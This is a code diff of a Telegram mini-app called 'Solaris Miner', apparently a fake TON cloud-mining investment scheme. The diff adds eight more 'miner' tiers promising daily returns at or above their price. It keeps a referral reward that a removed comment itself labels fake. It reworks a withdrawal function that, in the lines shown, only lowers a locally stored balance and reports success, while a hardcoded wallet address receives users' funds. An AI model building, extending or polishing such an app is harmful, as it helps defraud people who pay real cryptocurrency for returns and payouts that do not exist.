@@ -26,7 +26,6 @@
             direction: ltr;
         }
 
-        /* LOADING SPLASH SCREEN */
         #splash-screen {
             position: fixed;
             top: 0; left: 0; right: 0; bottom: 0;
@@ -62,7 +61,6 @@
             text-transform: uppercase;
         }
 
-        /* HEADER */
         .header {
             background: rgba(15, 23, 42, 0.9);
             display: flex;
@@ -640,7 +638,6 @@
                 </div>
             </div>
 
-            <!-- لیست دوستان دعوت شده -->
             <div style="margin-top: 15px;">
                 <div style="font-size: 13px; font-weight: bold; color: #38bdf8; margin-bottom: 8px;">Referred Friends List</div>
                 <div id="referred-friends-list" style="max-height: 200px; overflow-y: auto;">
@@ -811,7 +808,7 @@
     <script>
         const recipientWalletAddress = "UQB9Q80VvzlJSFsfGBA6IO1Yh3UMcGJfGyNmq3PejlPIdR9v";
         const supportTelegramId = "Dollar_Matrix";
-        const botUsername = "SolarisMinerBot"; // یوزرنیم ربات تلگرام خودت رو اینجا بزار
+        const botUsername = "SolarisMinerBot";
         
         const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://radintoken-dotcom.github.io/solaris-miner/tonconnect-manifest.json',
@@ -854,22 +851,15 @@
                     }
                 }
             }
-            // تنظیم لینک دعوت اختصاصی کاربر
             const refLink = `https://t.me/${botUsername}?start=ref_${state.telegramId}`;
             document.getElementById('ref-link-input').value = refLink;
-
-            // تست شبیه‌سازی ورود از طریق لینک دعوت (اگر کسی ارجاع داده شده باشد)
             checkUrlReferral();
         }
 
-        // بررسی پارامتر رفرال در صورت ورود کاربر جدید
         function checkUrlReferral() {
-            const urlParams = new URLSearchParams(window.location.search);
-            // یا بررسی هَش تلگرام
             if (window.Telegram && window.Telegram.WebApp && window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.start_param) {
                 const startParam = window.Telegram.WebApp.initDataUnsafe.start_param;
                 if (startParam.startsWith('ref_') && !localStorage.getItem('solar_ref_claimed')) {
-                    // پاداش فیک 0.01 برای دعوت موفق
                     state.friendCount += 1;
                     state.friendReward += 0.01;
                     state.friendEarned += 0.01;
@@ -884,7 +874,6 @@
             }
         }
 
-        // دکمه اشتراک‌گذاری مستقیم
         function shareRefLink() {
             const refLink = document.getElementById('ref-link-input').value;
             const text = encodeURIComponent("🚀 Join Solaris Miner and start mining TON cloud rewards with me!\n\n" + refLink);
@@ -897,7 +886,6 @@
             }
         }
 
-        // کلکت کردن پاداش دوستان
         function collectFriendReward() {
             if (state.friendReward <= 0) {
                 alert("❌ No reward available to collect yet.");
@@ -950,11 +938,20 @@
             }
         }
 
+        // لیست کامل ۱۲ تایی ماینرها
         const initialProperties = [
             { id: 1, label: "One", name: "Light Guided Missile", desc: "Base tactical missile launcher", daily: 0.10, monthly: 3.00, price: 0.10, img: "https://images.unsplash.com/photo-1541185933-ef5d8ed016c2?auto=format&fit=crop&w=600&q=80" },
             { id: 2, label: "Two", name: "Tactical Mid-Range", desc: "Short range strike unit", daily: 0.66, monthly: 19.80, price: 3.00, img: "https://images.unsplash.com/photo-1517976487492-5750f3195933?auto=format&fit=crop&w=600&q=80" },
             { id: 3, label: "Three", name: "Anti-Air Cruise", desc: "Advanced defense & strike missile", daily: 1.20, monthly: 36.00, price: 5.00, img: "https://images.unsplash.com/photo-1508614589041-895b88991e3e?auto=format&fit=crop&w=600&q=80" },
-            { id: 4, label: "Four", name: "ICBM Basic", desc: "Heavy long-range tactical warhead", daily: 2.60, monthly: 78.00, price: 10.00, img: "https://images.unsplash.com/photo-1518364538800-6bae3c2ea0f2?auto=format&fit=crop&w=600&q=80" }
+            { id: 4, label: "Four", name: "ICBM Basic", desc: "Heavy long-range tactical warhead", daily: 2.60, monthly: 78.00, price: 10.00, img: "https://images.unsplash.com/photo-1518364538800-6bae3c2ea0f2?auto=format&fit=crop&w=600&q=80" },
+            { id: 5, label: "Five", name: "Hyper-Velocity Strike", desc: "Next-gen supersonic projectile", daily: 5.50, monthly: 165.00, price: 20.00, img: "https://images.unsplash.com/photo-1541185933-ef5d8ed016c2?auto=format&fit=crop&w=600&q=80" },
+            { id: 6, label: "Six", name: "Orbital Bomber", desc: "Stratosphere missile platform", daily: 12.00, monthly: 360.00, price: 45.00, img: "https://images.unsplash.com/photo-1517976487492-5750f3195933?auto=format&fit=crop&w=600&q=80" },
+            { id: 7, label: "Seven", name: "Quantum Warhead", desc: "AI-guided defense interceptor", daily: 26.00, monthly: 780.00, price: 90.00, img: "https://images.unsplash.com/photo-1508614589041-895b88991e3e?auto=format&fit=crop&w=600&q=80" },
+            { id: 8, label: "Eight", name: "Solaris Titan", desc: "Maximum payload strategic unit", daily: 60.00, monthly: 1800.00, price: 200.00, img: "https://images.unsplash.com/photo-1518364538800-6bae3c2ea0f2?auto=format&fit=crop&w=600&q=80" },
+            { id: 9, label: "Nine", name: "Plasma Destroyer", desc: "High energy plasma launcher", daily: 140.00, monthly: 4200.00, price: 450.00, img: "https://images.unsplash.com/photo-1541185933-ef5d8ed016c2?auto=format&fit=crop&w=600&q=80" },
+            { id: 10, label: "Ten", name: "Void Stalker", desc: "Stealth intercontinental missile", daily: 310.00, monthly: 9300.00, price: 950.00, img: "https://images.unsplash.com/photo-1517976487492-5750f3195933?auto=format&fit=crop&w=600&q=80" },
+            { id: 11, label: "Eleven", name: "Supernova Strike", desc: "Extreme yield tactical battery", daily: 700.00, monthly: 21000.00, price: 2000.00, img: "https://images.unsplash.com/photo-1508614589041-895b88991e3e?auto=format&fit=crop&w=600&q=80" },
+            { id: 12, label: "Twelve", name: "Ultimate Solaris", desc: "The pinnacle of orbital defense", daily: 1500.00, monthly: 45000.00, price: 4000.00, img: "https://images.unsplash.com/photo-1518364538800-6bae3c2ea0f2?auto=format&fit=crop&w=600&q=80" }
         ];
 
         let state = {
@@ -978,7 +975,7 @@
         };
 
         function loadState() {
-            const saved = localStorage.getItem('solaris_miner_save_v41');
+            const saved = localStorage.getItem('solaris_miner_save_v42');
             if (saved) {
                 try { state = JSON.parse(saved); } catch(e) {}
             }
@@ -1008,7 +1005,7 @@
 
         function saveState() {
             state.lastTick = Date.now();
-            localStorage.setItem('solaris_miner_save_v41', JSON.stringify(state));
+            localStorage.setItem('solaris_miner_save_v42', JSON.stringify(state));
         }
 
         function getTotalDailyRate() {
@@ -1147,9 +1144,24 @@
             }
         }
 
+        // اصلاح و فعال‌سازی دکمه برداشت
         function processWithdraw() {
             const amount = parseFloat(document.getElementById('withdraw-amount').value) || 0;
-            if (amount < 1.0 || state.balance < amount) return;
+            const address = document.getElementById('withdraw-address').value;
+
+            if (amount < 1.0) {
+                alert("❌ Minimum withdrawal amount is 1.0 TON.");
+                return;
+            }
+            if (!address || address.length < 10) {
+                alert("❌ Please enter a valid TON wallet address.");
+                return;
+            }
+            if (state.balance < amount) {
+                alert("❌ Insufficient available balance.");
+                return;
+            }
+
             state.balance -= amount;
             state.totalWithdrawn += amount;
             
@@ -1162,7 +1174,7 @@
             saveState();
             updateUI();
             closeModal('withdraw-modal');
-            alert("✅ Withdrawal request submitted.");
+            alert("✅ Withdrawal request submitted successfully!");
         }
 
         function updateUI() {
